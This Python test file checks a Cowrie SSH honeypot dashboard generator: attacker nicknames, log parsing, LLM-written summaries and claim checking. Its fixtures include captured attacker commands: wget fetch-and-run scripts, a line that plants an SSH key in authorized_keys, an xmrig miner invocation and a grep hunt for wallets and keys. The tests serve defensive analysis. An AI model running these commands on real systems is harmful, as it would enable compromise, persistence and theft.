"""Nickname signatures, streaming parse, LLM two-pass/caching, deterministic output."""
import json
import os
import time
from datetime import datetime, timedelta, timezone

import pytest

from tests.conftest import _make_log_line

import generate


@pytest.fixture(autouse=True)
def _reset(mocker):
    mocker.patch('generate._check_ollama_once', return_value=False)
    mocker.patch('generate.load_cache', return_value={})
    mocker.patch('generate.save_cache')
    generate._nickname_cache.clear()
    generate._nickname_counter.clear()
    generate._nickname_source.clear()
    yield
    generate.LLM_ENABLED = True


GEO = {"countryCode": "NL", "country": "Netherlands"}


class TestNicknameSignatures:
    def test_ioc_keyword_wins(self):
        sig, src = generate._command_signature(["uname -a", "echo ssh-rsa AAAA mdrfckr >> .ssh/authorized_keys"])
        assert sig == "mdrfckr" and "authorized_keys" in src

    def test_payload_filename(self):
        sig, _ = generate._command_signature(["cd /tmp; wget http://1.2.3.4/bins.sh; sh bins.sh"])
        assert sig == "bins"

    def test_echo_marker_and_generic_commands(self):
        assert generate._command_signature(["echo HONEYPOT_TEST_1"])[0] == "honeypottest"
        assert generate._command_signature(["uname -a", "cat /proc/cpuinfo", "echo ok"]) == (None, None)

    def test_rarest_password_preferred(self):
        creds = [("root", "123456"), ("root", "sharedword"), ("root", "Jetaime!")]
        sig, kind, raw = generate._credential_signature(creds, {"sharedword": 50, "jetaime": 1})
        assert (sig, kind, raw) == ("jetaime", "password", "Jetaime!")

    def test_profanity_never_becomes_a_name(self):
        assert generate._slug("fuckyou123") is None
        assert generate._credential_signature([("root", "fuckyou")], {}) == (None, None, None)

    def test_no_more_root_suffix_and_names_unique(self):
        ips = [f"10.0.0.{i}" for i in range(1, 40)]
        creds = {ip: [("root", "root"), ("root", "admin"), ("root", "summer")] for ip in ips}
        generate.assign_nicknames(ips, {ip: GEO for ip in ips}, creds, {})
        names = [generate._nickname_cache[ip] for ip in ips]
        assert len(set(names)) == len(names)
        assert not any(n.endswith("_root") for n in names)
        # first claimant keeps the short form; later ones get more specific
        assert generate._nickname_cache[ips[0]].count("_") == 1
        assert generate.nickname_source_text(ips[0]) == "password: summer"

    def test_oldest_attacker_keeps_name_when_newcomer_arrives(self):
        geo = {"1.1.1.1": GEO, "2.2.2.2": GEO}
        creds = {"1.1.1.1": [("root", "zebra77")], "2.2.2.2": [("root", "zebra77")]}
        generate.assign_nicknames(["1.1.1.1"], geo, creds, {})
        first = generate._nickname_cache["1.1.1.1"]
        generate._nickname_cache.clear(); generate._nickname_counter.clear()
        generate.assign_nicknames(["1.1.1.1", "2.2.2.2"], geo, creds, {})
        assert generate._nickname_cache["1.1.1.1"] == first
        assert generate._nickname_cache["2.2.2.2"] != first


def _write(path, lines, mtime=None):
    path.write_text("\n".join(lines) + "\n")
    if mtime:
        os.utime(path, (mtime, mtime))


def _ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


class TestStreamingParse:
    def test_old_rotated_files_skipped_and_dedup(self, tmp_path, monkeypatch):
        now = datetime.now(timezone.utc)
        live = tmp_path / "cowrie.json"
        old = tmp_path / "cowrie.json.2020-01-01"
        recent = tmp_path / "cowrie.json.recent"
        line = _make_log_line("cowrie.login.failed", timestamp=_ts(now - timedelta(hours=2)),
                              username="root", password="x")
        _write(old, [line], mtime=time.time() - 90 * 86400)
        _write(recent, [line, _make_log_line("cowrie.client.version", timestamp=_ts(now))])
        _write(live, [line, "garbage {", _make_log_line("cowrie.session.connect", timestamp=_ts(now))])
        monkeypatch.setattr(generate, "LOG_PATH", str(live))
        events = list(generate.iter_window_events([str(old), str(recent), str(live)],
                                                  now - timedelta(days=60)))
        st = generate.iter_window_events.stats
        assert st["skipped_files"] == 1
        assert [e["eventid"] for e in events] == ["cowrie.login.failed", "cowrie.session.connect"]
        assert st["dup"] == 1

    def test_ts_info_matches_slow_path(self):
        for ts in ["2026-03-08T06:59:59.000000Z", "2026-03-08T07:00:00.000000Z",
                   "2026-11-01T05:30:00Z", "2026-11-01T06:30:00.123Z"]:
            dt = datetime.fromisoformat(ts.replace("Z", "+00:00")).astimezone(generate.LOCAL_TZ)
            want = (dt.strftime("%Y-%m-%d"), dt.strftime("%Y-%m-%d %H:00 ") + dt.strftime("%Z"), dt.hour)
            assert generate._ts_info(ts) == want
        assert generate._ts_info("not a time") is None
        assert generate._ts_info("2026-13-01T00:00:00Z") is None


def _data(tmp_path, lines):
    p = tmp_path / "c.json"
    p.write_text("\n".join(lines))
    geo = {"1.2.3.4": {"country": "Netherlands", "countryCode": "NL", "city": "<b>Ams</b>",
                       "lat": 52.0, "lon": 4.0, "isp": "ISP"}}
    return generate.analyze_events(generate.parse_log(str(p)), geo)


LINES = [
    _make_log_line("cowrie.session.connect"),
    _make_log_line("cowrie.login.success", username="root", password="toor"),
    _make_log_line("cowrie.command.input", input="uname -a"),
]


class TestLLMPasses:
    def test_fallback_not_cached_when_llm_fails(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        data = _data(tmp_path, LINES)
        cache = {}
        hits = generate.generate_greatest_hits(data, desc_cache=cache)
        assert hits and hits[0]["story"]
        assert not [k for k in cache if k.startswith("gh4_")]

    def test_cached_fallback_replaced_once_llm_is_up(self, tmp_path, mocker):
        good = "Logged in, ran uname to fingerprint the box, then left \u2014 window-shopping."
        mocker.patch('generate.llm_generate', return_value=good)
        mocker.patch('generate._check_ollama_once', return_value=True)
        data = _data(tmp_path, LINES)
        cache = {}
        generate.generate_greatest_hits(data, desc_cache=cache)
        (k,) = [k for k in cache if k.startswith("gh4_")]
        cache[k] = {"text": "Gained access and ran uname -a — hands-on-keyboard operator."}
        hits = generate.generate_greatest_hits(data, desc_cache=cache)
        assert hits[0]["story"] == good

    def test_llm_disabled_records_pending(self):
        generate.LLM_ENABLED, generate._llm_pending = False, 0
        assert generate.llm_generate("x") == ""
        assert generate._llm_pending == 1


class TestOutput:
    def test_data_file_deterministic_and_escaped(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        data = _data(tmp_path, LINES)
        _h1, j1 = generate.render_dashboard(data)
        _h2, j2 = generate.render_dashboard(data)
        assert j1 == j2
        strings = json.loads(j1)["markers"]["strings"]
        assert "&lt;b&gt;Ams&lt;/b&gt;" in strings and "<b>Ams</b>" not in strings

    def test_location_escaped_in_terminal(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        html, _ = generate.render_dashboard(_data(tmp_path, LINES))
        assert "<b>Ams</b>" not in html and "&lt;b&gt;Ams&lt;/b&gt;" in html

    def test_page_has_no_refresh_or_cdn(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        html, _ = generate.render_dashboard(_data(tmp_path, LINES))
        assert 'http-equiv="refresh"' not in html
        for host in ("unpkg.com", "jsdelivr", "googleapis", "chart.js"):
            assert host not in html
        assert "COWRIE SSH HONEYPOT //" not in html and "What They Did" not in html
        assert 'data-ip="1.2.3.4"' in html and "onclick=" not in html


class TestTerminalCaps:
    def test_commands_capped_per_attacker(self, tmp_path, mocker, monkeypatch):
        mocker.patch('generate.llm_generate', return_value="")
        monkeypatch.setattr(generate, "TERMINAL_MAX_CMDS", 5)
        monkeypatch.setattr(generate, "TERMINAL_MAX_CMD_CHARS", 50)
        lines = LINES[:2] + [_make_log_line("cowrie.command.input", input=f"echo n{i}",
                                            timestamp=f"2026-03-01T12:00:{i:02d}.000000Z")
                             for i in range(12)]
        lines.append(_make_log_line("cowrie.command.input", input="x" * 300,
                                    timestamp="2026-03-01T12:00:59.000000Z"))
        html, _ = generate.render_dashboard(_data(tmp_path, lines))
        assert html.count('<span class="cmd-prompt">$</span>') == 5
        assert "+8 more distinct commands" in html


class TestGreatestHitsSelection:
    def _lines(self):
        out = []
        def sess(ip, sid, cmds, attempts=1):
            for k in range(attempts):
                out.append(_make_log_line("cowrie.login.failed", src_ip=ip, session=sid + f"f{k}",
                                          username="root", password=f"p{k}"))
            out.append(_make_log_line("cowrie.login.success", src_ip=ip, session=sid, username="root", password="x"))
            out.extend(_make_log_line("cowrie.command.input", src_ip=ip, session=sid, input=c) for c in cmds)
        sess("9.9.9.9", "big", [], attempts=500)                                  # pure volume
        for i in range(8):                                                        # 8 identical uname bots
            sess(f"8.8.8.{i}", f"u{i}", ["uname -a"], attempts=100)
        sess("7.7.7.7", "tg", ["locate D877F783D5D3EF8Cs"])                       # rare + interesting
        sess("6.6.6.6", "dl", ["cd /tmp; wget http://1.2.3.4/x.sh; chmod +x x.sh; ./x.sh"])
        return out

    def test_interesting_and_distinct_attackers_win(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        p = tmp_path / "c.json"; p.write_text("\n".join(self._lines()))
        data = generate.analyze_events(generate.parse_log(str(p)), {})
        ips = [a["ip"] for a in generate.pick_greatest_hits(data)]
        assert ips[:2] == ["6.6.6.6", "7.7.7.7"] or set(ips[:2]) == {"6.6.6.6", "7.7.7.7"}
        assert "9.9.9.9" in ips                                  # biggest brute-forcer keeps a slot
        # every distinct behaviour gets a slot before any clone does
        assert sum(ip.startswith("8.8.8.") for ip in ips[:4]) == 1
        assert len(ips) == 6   # topped up only once distinct ones run out

    def test_fallback_story_is_the_verified_summary(self, tmp_path, mocker):
        mocker.patch('generate.llm_generate', return_value="")
        p = tmp_path / "c.json"; p.write_text("\n".join(self._lines()))
        data = generate.analyze_events(generate.parse_log(str(p)), {})
        hits = {h["ip"]: h for h in generate.generate_greatest_hits(data, desc_cache={})}
        assert hits["7.7.7.7"]["story"] == "Telegram session stealer: hunts for Telegram session files."
        assert hits["7.7.7.7"]["cmds"] == 1


class TestFriendlyDates:
    def test_formats(self):
        from datetime import datetime
        tz = generate.LOCAL_TZ
        t = lambda *a: datetime(*a, tzinfo=tz)
        today = "2026-11-08"
        assert generate.friendly_time(t(2026, 11, 8, 23, 32), today) == "23:32"
        assert generate.friendly_time(t(2026, 11, 7, 9, 5), today) == "Nov 7, 09:05"
        assert generate.friendly_time(t(2025, 12, 30, 9, 5), today) == "Dec 30, 2025, 09:05"
        assert generate.friendly_range(t(2026, 11, 8, 23, 10), t(2026, 11, 8, 23, 32), today) == "23:10–23:32"
        assert generate.friendly_range(t(2026, 11, 7, 1, 0), t(2026, 11, 7, 3, 12), today) == "Nov 7, 01:00–03:12"
        assert generate.friendly_range(t(2026, 9, 27, 1, 0), t(2026, 11, 8, 3, 0), today) == "Sep 27 – today"
        assert generate.friendly_day("2026-11-08", today) == "Today"
        assert generate.friendly_day("2026-11-07", today) == "Sat, Nov 7"


class TestClaimCheck:
    SCANNER = ["grep -rEl 'wallet\\.dat|mnemonic|xmrig|minerd|authorized_keys' /root /home"]

    def test_rejects_invented_mining_and_keys(self):
        ok, why = generate.check_claims("Scanned for wallets before deploying a miner.", self.SCANNER)
        assert not ok and "miner" in why
        ok, _ = generate.check_claims("Scanned for secrets, then injecting a SSH key.", self.SCANNER)
        assert not ok

    def test_allows_supported_claims(self):
        miner = ["./xmrig -o pool.supportxmr.com:443 -u 4AbC"]
        assert generate.check_claims("Deployed a Monero miner and left.", miner)[0]
        key = ['echo "ssh-rsa AAAA mdrfckr" >> .ssh/authorized_keys']
        assert generate.check_claims("Planted its own SSH key, mdrfckr style.", key)[0]
        assert generate.check_claims("Hunted rival miners and Telegram sessions.", self.SCANNER)[0]

    def test_profile_has_no_keyword_guesses(self):
        text = generate.build_profile_text("1.1.1.1", 5, [{}], self.SCANNER, [])
        assert "Deployed cryptominer" not in text and "SSH key injection" not in text
        assert "searches files for secrets" in text


class TestInsightTiles:
    def _data(self, tmp_path):
        lines = []
        for i in range(5):   # one operator rotating through a /24
            ip = f"109.160.32.{10 + i}"
            lines += [_make_log_line("cowrie.login.failed", src_ip=ip, session=f"r{i}", username="root",
                                     password=pw) for pw in ("Huawei@123", "1qaz@WSX", "345gs5662d34", "admin")]
        for i in range(3):   # mdrfckr: four steps that always happen together
            ip, sid = f"5.5.5.{i}", f"m{i}"
            lines += [_make_log_line("cowrie.login.success", src_ip=ip, session=sid, username="root", password="x"),
                      _make_log_line("cowrie.command.input", src_ip=ip, session=sid,
                                     input='cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh'),
                      ] + ([_make_log_line("cowrie.command.input", src_ip=ip, session=sid, input="uname -a")] if i else [])
        p = tmp_path / "c.json"; p.write_text("\n".join(lines))
        return generate.analyze_events(generate.parse_log(str(p)), {})

    def test_networks_group_by_block(self, tmp_path):
        html = generate.networks_html(self._data(tmp_path))
        assert "109.160.32.0/24" in html and ">5<" in html and ">20<" in html

    def test_campaigns_and_over_time(self, tmp_path):
        data = self._data(tmp_path)
        camp = generate.campaigns_html(data, data["data_today"])
        assert "mdrfckr SSH-key botnet" in camp and "3 IPs" in camp and 'data-ip="5.5.5.' in camp
        ot = generate.over_time_html(data)
        assert "Busiest day" in ot and "<svg" in ot and "Week of" in ot


def test_axis_steps_are_round():
    for v, top in [(3, 4), (30, 40), (48_000, 80_000), (98_221, 100_000), (1234, 2000), (9, 20)]:
        assert generate._nice_axis_max(v) == top
